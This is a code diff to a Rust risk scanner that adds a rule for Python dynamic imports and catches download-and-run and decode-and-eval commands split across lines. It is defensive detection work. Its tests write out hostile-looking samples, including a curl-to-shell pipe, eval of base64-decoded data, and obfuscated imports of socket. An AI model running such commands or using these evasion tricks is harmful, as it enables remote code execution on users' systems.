@@ -477,6 +477,9 @@ enum Extra {
     /// The rule also looks for a command that opens an archive with a
     /// password.
     ArchivePassword,
+    /// The rule also looks for a call of an import whose name is only known
+    /// at the time of the call.
+    DynamicImport,
 }
 
 /// One rule of the risk scan.
@@ -548,6 +551,12 @@ static RULES: LazyLock<Vec<Rule>> = LazyLock::new(|| {
             patterns: SOCIAL_ENGINEERING,
             extra: Extra::ArchivePassword,
         },
+        Rule {
+            name: "dynamic_import",
+            severity: Severity::Medium,
+            patterns: &[],
+            extra: Extra::DynamicImport,
+        },
     ]
 });
 
@@ -616,6 +625,76 @@ static ARCHIVE_PASSWORD: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"(?i)\bun(?:zip|rar)\b[^.\n]{0,30}password").expect("a pattern that compiles")
 });
 
+/// The text of a file with the newlines and the whitespace around them
+/// collapsed to single spaces.
+///
+/// The rules that look for a command that runs what it downloads and for a
+/// call of a decoder that is run are read over the text of a file and over
+/// this text as well, so a command that is spread over two lines is found
+/// as well.
+///
+/// Every line of the text keeps the place where it starts, so a finding
+/// still points at the line where the match begins.
+struct Flattened {
+    /// The text with the newlines collapsed to spaces.
+    text: String,
+    /// The place where every line of the text starts.
+    lines: Vec<FlatLine>,
+}
+
+/// The place where one line of the flattened text starts.
+struct FlatLine {
+    /// The place of the line in the flattened text.
+    flat: usize,
+    /// The place of the line in the text of the file.
+    raw: usize,
+}
+
+impl Flattened {
+    /// The place in the text of the file of a match of the flattened text.
+    ///
+    /// The place is the place where the line of the match starts plus the
+    /// place of the match behind the start of its line.
+    fn raw_offset(&self, offset: usize) -> usize {
+        if self.lines.is_empty() {
+            return offset;
+        }
+        let index = self
+            .lines
+            .partition_point(|line| line.flat <= offset)
+            .saturating_sub(1);
+        let line = &self.lines[index];
+        line.raw + offset.saturating_sub(line.flat)
+    }
+}
+
+/// The text of a file with the newlines and the whitespace around them
+/// collapsed to single spaces.
+///
+/// Every line of the text is trimmed and the lines are joined with a single
+/// space, so a command that is spread over two lines reads as one line.
+fn flatten(text: &str) -> Flattened {
+    let mut flat = String::with_capacity(text.len());
+    let mut lines = Vec::new();
+    let mut raw = 0usize;
+    let mut first = true;
+    for line in text.split('\n') {
+        if !first {
+            flat.push(' ');
+        }
+        first = false;
+        let trimmed = line.trim();
+        let leading = line.len() - line.trim_start().len();
+        lines.push(FlatLine {
+            flat: flat.len(),
+            raw: raw + leading,
+        });
+        flat.push_str(trimmed);
+        raw += line.len() + 1;
+    }
+    Flattened { text: flat, lines }
+}
+
 /// The findings of the risk rules in one file.
 ///
 /// Every rule reports the first match in the file, so a file that holds the
@@ -623,6 +702,7 @@ static ARCHIVE_PASSWORD: LazyLock<Regex> = LazyLock::new(|| {
 /// the file, relative to the skill root.
 pub fn scan_text(path: &str, text: &str) -> Vec<Finding> {
     let mut findings = Vec::new();
+    let mut flattened: Option<Flattened> = None;
     for rule in COMPILED_RULES.iter() {
         if rule.name == "social_engineering" && !is_text_file(path) {
             continue;
@@ -633,6 +713,23 @@ pub fn scan_text(path: &str, text: &str) -> Vec<Finding> {
             .filter_map(|pattern| pattern.find(text))
             .map(|found| found.start())
             .min();
+        if rule.name == "remote_exec" || rule.name == "decode_exec" {
+            // The rules that look for a command that runs what it downloads
+            // and for a call of a decoder that is run are read over the text
+            // with the newlines collapsed as well, so a command that is
+            // spread over two lines is found as well.
+            let flat = flattened.get_or_insert_with(|| flatten(text));
+            if let Some(offset) = rule
+                .patterns
+                .iter()
+                .filter_map(|pattern| pattern.find(&flat.text))
+                .map(|found| found.start())
+                .min()
+            {
+                let raw = flat.raw_offset(offset);
+                first = Some(first.map_or(raw, |current| current.min(raw)));
+            }
+        }
         match rule.extra {
             Extra::None => {}
             Extra::Javascript => {
@@ -652,6 +749,13 @@ pub fn scan_text(path: &str, text: &str) -> Vec<Finding> {
             }
             Extra::ArchivePassword => {
                 if let Some(offset) = archive_password_offset(text) {
+                    first = Some(first.map_or(offset, |current| current.min(offset)));
+                }
+            }
+            Extra::DynamicImport => {
+                if is_python_file(path, text)
+                    && let Some(offset) = crate::catalog::dynamic_import_offset(text)
+                {
                     first = Some(first.map_or(offset, |current| current.min(offset)));
                 }
             }
@@ -683,6 +787,29 @@ fn is_text_file(path: &str) -> bool {
         extension.as_str(),
         "md" | "markdown" | "mdx" | "txt" | "text" | "rst" | "adoc" | "asciidoc" | "org"
     )
+}
+
+/// Whether a file can hold python code.
+///
+/// A file with the extension of Python holds python code, and a file without
+/// an extension can hold it as well, because the interpreter of such a file
+/// is named in its first line.
+///
+/// A file with another extension holds python code as well when its first
+/// line names a python interpreter, so a file of the shell that runs python
+/// holds python code. The rule of the dynamic import looks at the files of
+/// python only, so it looks at the files whose interpreter is python as
+/// well.
+fn is_python_file(path: &str, text: &str) -> bool {
+    let extension = Path::new(path)
+        .extension()
+        .and_then(|extension| extension.to_str())
+        .unwrap_or_default()
+        .to_ascii_lowercase();
+    if matches!(extension.as_str(), "py" | "pyw" | "") {
+        return true;
+    }
+    crate::catalog::shebang_language(text) == Some("python")
 }
 
 /// The offset of the twentieth javascript identifier of a file.
@@ -1279,6 +1406,77 @@ mod tests {
                 "the social_engineering rule does not find {text}"
             );
         }
+    }
+
+    #[test]
+    fn an_import_whose_name_is_only_known_at_the_call_is_found() {
+        let cases = [
+            "module = __import__(f\"socket\")",
+            "module = __import__(name)",
+            "module = __import__(\"so\" + \"cket\")",
+            "module = importlib.import_module(name)",
+            "module = importlib.import_module(f\"socket\")",
+        ];
+        for text in cases {
+            let findings = scan_text("run.py", text);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule == "dynamic_import"),
+                "the dynamic_import rule finds {text}"
+            );
+        }
+        // A name in a plain string is a name that the scan can read, so it
+        // is no finding.
+        let findings = scan_text("run.py", "module = __import__(\"socket\")");
+        assert!(
+            !findings
+                .iter()
+                .any(|finding| finding.rule == "dynamic_import"),
+            "{findings:?}"
+        );
+    }
+
+    #[test]
+    fn the_dynamic_import_rule_reads_the_interpreter_of_the_file() {
+        // A file of the shell that runs python holds python code, so the
+        // rule of the dynamic import reads it as well.
+        let findings = scan_text("run.sh", "#!/usr/bin/python3\nmodule = __import__(name)\n");
+        assert!(
+            findings
+                .iter()
+                .any(|finding| finding.rule == "dynamic_import"),
+            "{findings:?}"
+        );
+        // A file of the shell that runs the shell holds no python code, so
+        // the rule of the dynamic import leaves it out.
+        let findings = scan_text("run.sh", "#!/bin/sh\nmodule = __import__(name)\n");
+        assert!(
+            !findings
+                .iter()
+                .any(|finding| finding.rule == "dynamic_import"),
+            "{findings:?}"
+        );
+    }
+
+    #[test]
+    fn a_command_that_is_spread_over_two_lines_is_found() {
+        let findings = scan_text(
+            "run.py",
+            "result = eval(\n    base64.b64decode(payload)\n)\n",
+        );
+        assert!(
+            findings.iter().any(|finding| finding.rule == "decode_exec"),
+            "{findings:?}"
+        );
+        let findings = scan_text(
+            "setup.sh",
+            "curl https://example.com/install.sh \\\n  | sh\n",
+        );
+        assert!(
+            findings.iter().any(|finding| finding.rule == "remote_exec"),
+            "{findings:?}"
+        );
     }
 
     #[test]
